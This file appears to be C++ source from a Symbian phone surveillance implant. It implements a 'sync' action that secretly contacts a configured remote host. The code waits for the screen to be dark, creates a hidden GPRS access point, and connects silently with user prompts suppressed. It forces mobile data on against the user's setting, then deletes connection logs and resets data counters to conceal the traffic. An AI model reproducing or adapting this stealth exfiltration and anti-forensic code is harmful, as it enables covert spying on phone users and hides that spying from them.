/*
 * ActionSyncApn.cpp
 *
 *  Created on: 25/ott/2010
 *      Author: Giovanna
 */

#include "ActionSyncApn.h"
#include "Json.h"

#include <HT\Processes.h>

#include <es_enum.h>     // for TConnectionInfoBuf
#include <rconnmon.h>	 // for connection monitor, add connmon.lib

#include <apaccesspointitem.h>
#include <CommsDatTypesV1_1.h>   

#include <hal.h>
#include <hwrmlight.h>	// check display light when HAL isn't working 

#include <centralrepository.h>			// detect offline mode
#include <CoreApplicationUIsSDKCRKeys.h>

#include "ConnLogCleaner.h"		// delete wlan and gprs connection logs

#include "AgentCrisis.h"

#ifndef __SERIES60_3X__  //only Symbian^3
#include <mw/extendedconnpref.h>  //delete info note about failed connections
#include <connpref.h>
#include <comms-infras/esock_params.h> 
#endif

// CenRep stuff
// Mobile Data on/off
// /mw/ipconnmgmt/ipcm_plat/extended_connection_settings_api/inc/cmmanagerkeys.h
const TUid KCRUidCmManager = {0x10207376};
const TUint32 KCurrentCellularDataUsage  = 0x00000001;
// Data counters
// /mw/ipconnmgmt/ipcm_pub/data_connection_log_counters_api/inc/dclcrkeys.h
const TUid KCRUidDCLLogs = {0x101F4CD5};
const TUint32 KLogsGPRSSentCounter     = 0x0000000C;
const TUint32 KLogsGPRSReceivedCounter = 0x0000000D;
const TUint32 KLogsWLANSentCounter     = 0x00000014;
const TUint32 KLogsWLANReceivedCounter = 0x00000015;

_LIT(KIapName,"3G Internet");
    
CActionSyncApn::CActionSyncApn(TQueueType aQueueType) :
	CAbstractAction(EAction_SyncApn, aQueueType), iApnList(1), iStopSubactions(EFalse), iRestoreMobileDataStatus(EFalse) 
	{
	// No implementation required
	}

CActionSyncApn::~CActionSyncApn()
	{
	__FLOG(_L("Destructor"));
	
	delete iProtocol;
	delete iApDataHandler;
	delete iApUtils;
	delete iCommsDb;
	
	iConnection.Close();
	iSocketServ.Close();
	
	iApnList.Reset();
	iApnList.Close();
	
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

CActionSyncApn* CActionSyncApn::NewLC(const TDesC8& params, TQueueType aQueueType)
	{
	CActionSyncApn* self = new (ELeave) CActionSyncApn(aQueueType);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionSyncApn* CActionSyncApn::NewL(const TDesC8& params, TQueueType aQueueType)
	{
	CActionSyncApn* self = CActionSyncApn::NewLC(params, aQueueType);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionSyncApn::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN("HT", "ActionSyncApn.txt");
	__FLOG(_L("------------"));
		
	BaseConstructL(params);

	//read parameters
	RBuf paramsBuf;
			
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
			
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	TApnStruct apnStruct;
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve apn data
		CJsonObject* apnObject;
		rootObject->GetObjectL(_L("apn"),apnObject);
		apnObject->GetStringL(_L("name"),apnStruct.apnName);
		apnObject->GetStringL(_L("user"),apnStruct.apnUsername);
		apnObject->GetStringL(_L("pass"),apnStruct.apnPasswd);
		iApnList.AppendL(apnStruct);
		//retrieve host address
		rootObject->GetStringL(_L("host"),iHostName);
		//retrieve stop flag
		rootObject->GetBoolL(_L("stop"),iStopSubactions);
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	
	iSocketServ.Connect();
	iProtocol = CProtocol::NewL(*this);	
	
	iCommsDb = CCommsDatabase::NewL();
	iApDataHandler = CApDataHandler::NewLC(*iCommsDb);
	CleanupStack::Pop(iApDataHandler);
	iApUtils = CApUtils::NewLC(*iCommsDb);
	CleanupStack::Pop(iApUtils);
	
	}


void CActionSyncApn::DispatchStartCommandL()
	{
	if (iConditioned)
		{
		// we are conditioned by a previous sync, we get the result
		TInt value = 0;
		RProperty::Get(KPropertyUidCore, KPropertyStopSubactions,value);
		if(value != 0)
			{
			//we have to stop
			MarkCommandAsDispatchedL();
			SetFinishedJob(ETrue);
			return;
			}
		}
		
	//else we reset property
	RProperty::Set(KPropertyUidCore, KPropertyStopSubactions,0);
	
	// If  we are offline we don't start connection because a prompt would be showed to the user
	if(OfflineL())
		{
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		return;
		}
		
	// if we are in crisis don't go further
	// see AgentCrisis.cpp for hex values
	TInt flags=0;
	RProperty::Get(KPropertyUidCore, KPropertyCrisis,flags);
	if(flags & ESyncCrisis)
		{
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		return;
		}
		
	iConnection.Close();
	TInt err = KErrNone;
	// RConnection::Open can leave when there isn't any IAP available.
	TRAPD(panicErr, err = iConnection.Open(iSocketServ) );
	if (panicErr != KErrNone || err != KErrNone)
		{
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		return;
		}
	
	// we have to check the display status
	TInt value;
	TInt displayErr = KErrNone;
	displayErr = HAL::Get(HAL::EDisplayState,value);
		
	// comment out this part when debugging coz display always on when using TRK
	//value = 0; 
	if (value == 1)
		{
#ifndef __SERIES60_30__
		// on 5th and Symbian3 devices we require black screen
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		return;
#endif
		//on 3rd we check backlight status
		TInt backlightState;
		displayErr = HAL::Get( HALData::EBacklightState, backlightState );
		__FLOG_1(_L("backlight state, displayErr=%d"),displayErr);
		__FLOG_1(_L("backlight state, value = %d"),backlightState);
		if(displayErr == KErrNone)
			{
			//backlight status is valid
			if(backlightState==1)
				{
				//backlight is active... next time
				__FLOG(_L("Backlight active"));
				MarkCommandAsDispatchedL();
				SetFinishedJob(ETrue);
				return;
				}
			}
		else
			{
			// sometimes displayErr = -5: KErrNotSupported, the operation requested is not supported (e.g. on E71)
			// let's try in another way
			CHWRMLight* light = CHWRMLight::NewLC();
			CHWRMLight::TLightStatus lightStatus = light->LightStatus(CHWRMLight::EPrimaryDisplay);
			CleanupStack::PopAndDestroy(light);
			__FLOG_1(_L("CHWRMLight status: %d"),lightStatus);
			if(lightStatus != CHWRMLight::ELightOff)
				{
				//backlight is active... next time
				__FLOG(_L("Backlight active"));
				MarkCommandAsDispatchedL();
				SetFinishedJob(ETrue);
				return;
				}
			}
		}
		
	// create the access point
	// please mind that on N96 and few other devices, iapId is different from iApUid...
	// iApUid is the Uid of the created access point, and it's used for deleting it when finished
	// iapId is the id of the IAP record in particular, and it's used into the connection pref to force the silent connection
	// crazy isn't it????????
	TUint32 iapId = 0;  
	TRAPD(leaveCode,CreateIapL(iApnList[0],iapId));  
	if(leaveCode != KErrNone)  
		{
		// if we can't create ap we graciously try next time
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		return;
		}
	
	#ifndef __SERIES60_3X__  //only Symbian^3
	iRestoreMobileDataStatus = SetMobileDataOn();
	#endif
	
	GetCounterData();
	
	/*
	TCommDbConnPref	pref;
	pref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
	pref.SetDirection(ECommDbConnectionDirectionOutgoing);
	pref.SetIapId(iapId);   
	*/
	#ifndef __SERIES60_3X__  //only Symbian^3   
	TConnPrefList pref;
	TExtendedConnPref extPrefs;
	extPrefs.SetSnapPurpose( CMManager::ESnapPurposeInternet );
	extPrefs.SetNoteBehaviour( TExtendedConnPref::ENoteBehaviourConnSilent ); //static const TUint32 ENoteBehaviourConnSilent = ENoteBehaviourConnDisableNotes | ENoteBehaviourConnDisableQueries;
	pref.AppendL(&extPrefs);
	TConnAPPref*  apPref = TConnAPPref::NewL();
	CleanupStack::PushL(apPref);
	apPref->SetAP(iapId);
	pref.AppendL(apPref);
	#else
	TCommDbConnPref pref;
	pref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
	pref.SetDirection(ECommDbConnectionDirectionOutgoing);
	pref.SetIapId(iapId);
	#endif
			
	err = iConnection.Start(pref);   
	
	if (err != KErrNone)
		{
		// clean phone registry
		CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
		TRAPD(result,logCleaner->DeleteConnLogSyncL(EGprs));
		CleanupStack::PopAndDestroy(logCleaner);
		
		//restore mobile data status
		#ifndef __SERIES60_3X__  //only Symbian^3
		if(iRestoreMobileDataStatus)
			{
			CRepository* repository = NULL;
			TRAPD(error,repository = CRepository::NewL( KCRUidCmManager ));
			if ((error == KErrNone) && repository)
				{
				CleanupStack::PushL(repository);
				TInt err = repository->Set(KCurrentCellularDataUsage,2); // restore to Off
				CleanupStack::PopAndDestroy(repository);
				}
			}
		#endif
		
		//restore mobile data counter
		if(iGprsSentCounter.Length()!=0)
			{
			SetCounterData();
			}
		
		// delete ap
		RemoveIapL(iApUid); 
		
		#ifndef __SERIES60_3X__  //only Symbian^3
		CleanupStack::PopAndDestroy(apPref);
		#endif
			
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		return;
		}
	
	//TODO: monitoring of user activity has been disabled, we had problems on older devices when dropping down gprs syncs
	// start sync.... at last! and monitor user activity
	//iProtocol->StartRestProtocolL( ETrue, iSocketServ, iConnection, iHostName, 80 );
	#ifndef __SERIES60_3X__  //only Symbian^3
	CleanupStack::PopAndDestroy(apPref);
	#endif
		
	iProtocol->StartRestProtocolL( EFalse, iSocketServ, iConnection, iHostName, 80 );
			
	}


void CActionSyncApn::ConnectionTerminatedL(TInt aError)
	{
	__FLOG(_L("ConnectionTerminatedL()"));
	iConnection.Close();			
	
	// delete log from phone registry
	CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
	TRAPD(result,logCleaner->DeleteConnLogSyncL(EGprs));
	CleanupStack::PopAndDestroy(logCleaner);
	
	//restore mobile data status
	#ifndef __SERIES60_3X__  //only Symbian^3
	if(iRestoreMobileDataStatus)
		{
		CRepository* repository = NULL;
		TRAPD(error,repository = CRepository::NewL( KCRUidCmManager ));
		if ((error == KErrNone) && repository)
			{
			CleanupStack::PushL(repository);
			TInt err = repository->Set(KCurrentCellularDataUsage,2); // restore to Off
			CleanupStack::PopAndDestroy(repository);
			}
		}
	#endif
		
	//restore mobile data counter
	if(iGprsSentCounter.Length()!=0)
		{
		SetCounterData();
		}
			
	// remove access point
	RemoveIapL(iApUid); 
	
	// load the new config if present
	if(iNewConfig) 
		{
		RProperty::Set(KPropertyUidSharedQueue, KPropertyKeySecondarySharedQueueTopAddedOrRemoved, 0xEFBE);
		} 
	else 
		{
		if(iStopSubactions)
			{
			RProperty::Set(KPropertyUidCore, KPropertyStopSubactions,1);
			}
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
		}
	}

void CActionSyncApn::NewConfigDownloaded()
	{
		iNewConfig = ETrue;
	}

void CActionSyncApn::CreateIapL(TApnStruct aApnStruct, TUint32& aIapId)
	{
	iApUid=0;
	
	CApAccessPointItem* apItem = CApAccessPointItem::NewLC();
	
	// GPRS type
	apItem->SetBearerTypeL(EApBearerTypeGPRS);
	// apn, the MNO access (ex. ibox.tim.it)
	apItem->WriteLongTextL(EApGprsAccessPointName,aApnStruct.apnName );
	// username
	if(aApnStruct.apnUsername.Length() != 0)
		{
		apItem->WriteTextL(EApIspLoginName,aApnStruct.apnUsername);
		apItem->WriteTextL(EApIspIfAuthName,aApnStruct.apnUsername);
		apItem->WriteTextL(EApGprsIfAuthName,aApnStruct.apnUsername);
		}
	// password
	if(aApnStruct.apnPasswd.Length() !=0)
		{
		apItem->WriteTextL(EApIspLoginPass,aApnStruct.apnPasswd);
		apItem->WriteTextL(EApIspIfAuthPass,aApnStruct.apnPasswd);
		apItem->WriteTextL(EApGprsIfAuthPassword,aApnStruct.apnPasswd);
		}
	// autenticazione protetta(ETrue)/normale(EFalse)
	apItem->WriteBool(EApGprsDisablePlainTextAuth,EFalse);
	// access point name (the name of the access point on the phone)
	apItem->SetNamesL(KIapName);
	// save the access point
	iApUid = iApDataHandler->CreateFromDataL(*apItem);
	// retrieve the iapId used to force the silent connection
	aIapId = iApUtils->IapIdFromWapIdL(iApUid);
	//TUint32 iapId = apItem->WapUid();   //this is the same value as iApUid, the uid of the created access point, used for delete it
	//apItem->ReadUint(EApWapAccessPointID,iapId); // uid of the created access point, used for deleting it
	//apItem->ReadUint(EApWapIap,iapId);  // uid of the IAP, used to force the connection
	
	CleanupStack::PopAndDestroy(apItem);
	
	}

void CActionSyncApn::RemoveIapL(TUint32 aUid)
	{
	// first we try to remove the ap created at this run
	TInt leaveCode;
	TInt i=0;
	while((leaveCode!=KErrNone) && (i<300))
		{
		TRAP(leaveCode,iApDataHandler->RemoveAPL(aUid));  
		i++;
		}
	// This is a little tricky...
	// Sometimes, gprs access point just created it's not deleted with the previous method. So we have to search 
	// and cancel all gprs access points that we have created and left behind in previous sync.
	// The point is: in some devices, like N96, ap uids are messed up... one is the iap uid, and one is 
	// the wap ap uid (used to force connection)
	// With the procedure below we find the iap uid (used to create ap).
	// If you want to find the iapId, use CCDIAPRecord (KCDTIdIAPRecord)
	// instead of CCDIAPRecord
	CMDBSession* db = CMDBSession::NewLC(KCDLatestVersion);
	CMDBRecordSet<CCDWAPAccessPointRecord>* apRecordSet = new(ELeave) CMDBRecordSet<CCDWAPAccessPointRecord>(KCDTIdWAPAccessPointRecord);
	CleanupStack::PushL(apRecordSet);
	apRecordSet->LoadL(*db);
	CCDWAPAccessPointRecord* apRecord =NULL;
	TInt count = apRecordSet->iRecords.Count();
	for(TInt i=0; i<count; i++)
		{
		apRecord = static_cast<CCDWAPAccessPointRecord*>(apRecordSet->iRecords[i]);
		RBuf apName;
		apName.CreateL(apRecord->iRecordName);
		apName.CleanupClosePushL();
		if(apName.FindC(KIapName)!=KErrNotFound)
			{
			// we have to delete it
			TUint32 apUid = apRecord->RecordId();
			TInt leaveErr;
			TInt k=0;
			while((leaveErr!=KErrNone) && (k<300))
				{
				TRAP(leaveErr,iApDataHandler->RemoveAPL(apUid));  
				k++;
				}
			} 
		CleanupStack::PopAndDestroy(&apName);  		
		}
	CleanupStack::PopAndDestroy(apRecordSet);
	CleanupStack::PopAndDestroy(db);
	}


// http://wiki.forum.nokia.com/index.php/How_to_Detect_Offline_Mode_in_3rd_Edition
// http://wiki.forum.nokia.com/index.php/How_to_check_if_the_phone_is_in_offline_mode
TBool CActionSyncApn::OfflineL()
	{
	TBool offline = EFalse;
	TInt value=0;
	
	CRepository* repository = CRepository::NewLC(KCRUidCoreApplicationUIs);
	// Check offline mode on or not.
	if (repository->Get(KCoreAppUIsNetworkConnectionAllowed, value) == KErrNone)
	    {
	     // Do something based on value
		if( value == ECoreAppUIsNetworkConnectionNotAllowed)
			offline = ETrue;
	    }
	CleanupStack::PopAndDestroy(repository);
	return offline;
	}

TBool CActionSyncApn::SetMobileDataOn()
	{
	TBool restore = EFalse;
	CRepository* repository = NULL;
	TRAPD(error,repository = CRepository::NewL( KCRUidCmManager ));
	if ((error == KErrNone) && repository)
		{
		CleanupStack::PushL(repository);
		TInt value;
		TInt err = repository->Get(KCurrentCellularDataUsage,value); 
		// /mw/ipconnmgmt/ipcm_pub/connection_settings_api/inc/cmgenconnsettings.h
		// value = 1, ECmCellularDataUsageAutomatic,
		// value = 2, ECmCellularDataUsageDisabled
		if((err == KErrNone) && (value == 2))
			{
			err = repository->Set(KCurrentCellularDataUsage,1); // force to On
			restore = ETrue;
			}		
		CleanupStack::PopAndDestroy(repository);
		}
	return restore;
	}

void CActionSyncApn::GetCounterData()
	{
	CRepository* repository = NULL;
	TRAPD(error,repository = CRepository::NewL(KCRUidDCLLogs));
	if(error == KErrNone)
		{
		CleanupStack::PushL(repository);
		repository->Get(KLogsGPRSSentCounter, iGprsSentCounter);
		repository->Get(KLogsGPRSReceivedCounter,iGprsReceivedCounter);
		CleanupStack::PopAndDestroy(repository);
		}
	}

void CActionSyncApn::SetCounterData()
	{
	CRepository* repository = NULL;
	TRAPD(error,repository = CRepository::NewL(KCRUidDCLLogs));
	if(error == KErrNone)
		{
		CleanupStack::PushL(repository);
		repository->Set(KLogsGPRSSentCounter, iGprsSentCounter);
		repository->Set(KLogsGPRSReceivedCounter,iGprsReceivedCounter);
		CleanupStack::PopAndDestroy(repository);
		}
	}

